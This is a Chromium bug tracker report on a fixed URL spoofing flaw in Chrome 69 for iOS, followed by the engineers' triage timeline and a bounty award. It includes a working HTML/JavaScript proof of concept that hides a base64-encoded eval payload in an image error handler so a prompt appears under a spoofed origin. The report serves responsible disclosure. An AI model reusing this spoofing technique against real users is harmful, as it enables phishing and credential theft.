# Chrome v69 URL spoofing vulnerability on IOS

| Field | Value |
|-------|-------|
| **Issue ID** | [40092380](https://issues.chromium.org/issues/40092380) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Interstitials, UI>Browser>Navigation |
| **Platforms** | iOS |
| **Reporter** | ev...@gmail.com |
| **Assignee** | kk...@chromium.org |
| **Created** | 2018-09-06 |
| **Bounty** | $1,000.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36

Steps to reproduce the problem:
1. PoC: https://server.n0tr00t.com/chrome/v69_mobile_url_spoof.html
2. Click test <a> tag
3. We'll see the effect of a successful hijacking

What is the expected behavior?

What went wrong?
```
    <html>
    <head>
        <title>Chrome URL spoofing vulnerability on IOS</title>
        <!--
            author: evi1m0.bat[at]gmail.com
            test version: Chrome 69.0.3497 for iOS
        -->
    </head>
    <script>
        pwn = () => {
            x = window.open("about:blank", "test");
            x.document.write("<img src=@ onerror=eval(atob('c2V0VGltZW91dCgicHJvbXB0KCdmYWtlIGJhaWR1LmNvbSAsIERvbnQgZW50ZXIgcGFzc3dvcmQgeEQnKSIsMjAwMCk='))>");
            setTimeout("x.location='https://test.baidu.com'", 1000);
        }
    </script>
    <a onclick="pwn()"><h1>Clickme</h1></a>
    </html>
```

Did this work before? N/A 

Chrome version: 69.0.3497.81  Channel: stable
OS Version: OS X 10.13.5
Flash Version: 

n/a

## Attachments

- [evi1m0 2018-09-09 19.01.17.mp4](attachments/evi1m0 2018-09-09 19.01.17.mp4) (video/mp4, 272.7 KB)
- [WechatIMG457.png](attachments/WechatIMG457.png) (image/png, 393.8 KB)
- [alert screenshot.png](attachments/alert screenshot.png) (image/png, 43.2 KB)

## Timeline

### mp...@google.com (2018-09-06)

Not sure where this bug belongs, so CC'ing some of the Enamel and Bling people to to assess severity and see where this should belong. Potentially none of you should own this.

[Monorail components: UI>Browser>Navigation UI>Browser>Omnibox]

### ct...@chromium.org (2018-09-06)

+carlosil for more interstitials knowledge

Non-committed interstitials allow the prior javascript context to keep running, which I think is the underlying cause here. IIRC on Desktop this didn't allow things like alerts/input modals though, so this is a more dangerous consequence.

I would suggest Severity-Medium for this. It allows complete control of the origin in the omnibox (Sev-High) but it is restricted to showing the interstitial underneath rather than arbitrary page content (so bumping it down to Medium for the fairly substantial mitigating factor).

### ju...@chromium.org (2018-09-06)

[Empty comment from Monorail migration]

### eu...@chromium.org (2018-09-06)

Srikanth, could you please check if this bug is reproducible with slim-navigation-manager.

### ct...@chromium.org (2018-09-06)

Would the slim-navigation-manager treat the interstitials like committed navigations, where the prior page context is unloaded? (c.f. https://crbug.com/chromium/392354 and the committed interstitials refactoring work.)

Related bug (from the same reporter :-)): https://crbug.com/chromium/843095

### ct...@chromium.org (2018-09-06)

(Rearranging some components for what I think is more accurate here.)

[Monorail components: -UI>Browser>Omnibox UI>Browser>Interstitials]

### eu...@chromium.org (2018-09-07)

slim-navigation-manager will not treat the interstitials like committed navigations

### sh...@chromium.org (2018-09-07)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-07)

[Empty comment from Monorail migration]

### ct...@chromium.org (2018-09-07)

I can confirm that this still repros with slim-navigation-manager enabled on iOS Chrome Dev.

### eu...@chromium.org (2018-09-07)

Sorry, I thought this is an omnibox URL spoofing bug. Kurt, I thought we fixed alert text for M69. Do you think it's a different bug?

### sr...@chromium.org (2018-09-07)

Sorry for the delay. Let me know if I need to still test this.
Looks like similar bug http://crbug/839822 was fixed in M69 in the past.

### ev...@gmail.com (2018-09-18)

delay..

### sh...@chromium.org (2018-09-20)

kkhorimoto: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### kk...@chromium.org (2018-09-20)

[Empty comment from Monorail migration]

### ev...@gmail.com (2018-10-17)

delay..

### sh...@chromium.org (2018-12-05)

[Empty comment from Monorail migration]

### eu...@chromium.org (2019-01-15)

Kurt, do you have any updates for this bug?

### kk...@chromium.org (2019-01-17)

Doesn't look like this occurs anymore; the URL and content area remains about:blank when attempting the PoC in c#1

https://drive.google.com/open?id=1x-e9H7k9-m32eDCWycyQDL6xRak_J9Az

### kk...@chromium.org (2019-01-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-30)

[Empty comment from Monorail migration]

### eu...@chromium.org (2019-02-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-03-13)

[Empty comment from Monorail migration]

### li...@chromium.org (2019-04-01)

Per https://crbug.com/chromium/881267#c19, is this bug now obsolete?

### kk...@chromium.org (2019-04-02)

Yes, marking as Fixed.

### sh...@chromium.org (2019-04-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-04-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-04)

This bug requires manual review: Less than 15 days to go before AppStore submit on M74
Please contact the milestone owner if you have questions.
Owners: govind@(Android), kariahda@(iOS), dgagnon@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### kk...@chromium.org (2019-04-04)

No merge necessary.

### na...@google.com (2019-04-10)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-04-10)

Congrats the Panel decided to reward $1,000 for this report! 

### na...@google.com (2019-04-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-07-10)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/881267?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: UI>Browser>Interstitials, UI>Browser>Navigation]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092380)*
